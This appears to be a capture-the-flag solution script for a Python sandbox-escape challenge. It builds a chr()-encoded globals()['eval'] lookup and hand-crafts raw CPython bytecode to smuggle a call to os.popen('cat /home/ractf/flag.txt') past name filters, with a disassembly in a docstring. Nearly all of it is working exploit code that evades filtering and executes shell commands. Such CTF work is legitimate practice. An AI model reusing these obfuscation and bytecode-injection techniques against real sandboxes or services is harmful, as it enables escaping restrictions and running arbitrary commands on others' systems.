
key = 'eval'
template = "globals()[{}]"
dyn = ''
for char in key:
    dyn += f'chr({ord(char)})+'
dyn = dyn[:-1]
final = template.format(dyn)
print(final)
#model
"""
>>> t.co_code
e\x00\x83\x00e\x01d\x00\x83\x01e\x01d\x01\x83\x01\x17\x00e\x01d\x02\x83\x01\x17\x00e\x01d\x03\x83\x01\x17\x00\x19\x00S\x00
>>> import dis
>>> dis.dis(t)
  1           0 LOAD_NAME                0 (globals)
              2 CALL_FUNCTION            0
              4 LOAD_NAME                1 (chr)
              6 LOAD_CONST               0 (101)
              8 CALL_FUNCTION            1
             10 LOAD_NAME                1 (chr)
             12 LOAD_CONST               1 (118)
             14 CALL_FUNCTION            1
             16 BINARY_ADD
             18 LOAD_NAME                1 (chr)
             20 LOAD_CONST               2 (97)
             22 CALL_FUNCTION            1
             24 BINARY_ADD
             26 LOAD_NAME                1 (chr)
             28 LOAD_CONST               3 (108)
             30 CALL_FUNCTION            1
             32 BINARY_ADD
             34 BINARY_SUBSCR
             36 RETURN_VALUE
>>> quit()
"""
code = b't\x02\x83\x00'
code += b't\x00d\x65\x83\x01'
for char in 'val':
    code += b't\x00'
    code += b'd' + bytes([ord(char)])
    code += b'\x83\x01\x17\x00'
# Now, globals and 'eval' are on the stack. Call binary SUBSCR
code += b'\x19\x00'
print(code)
# Grabs function eval. We're close...
final += '('
command = "__builtins__.__import__('os').popen('cat /home/ractf/flag.txt').read()"
for char in command:
    final += f"chr({ord(char)})+"
final = final[:-1]
final += ')'
print(final)
for index,char in enumerate(command):
    code += b't\x00'
    code += b'd' + bytes([ord(char)])
    code += b'\x83\x01'
    if index > 0:
        code += b'\x17\x00'
code += b'\x83\x01'
print(code)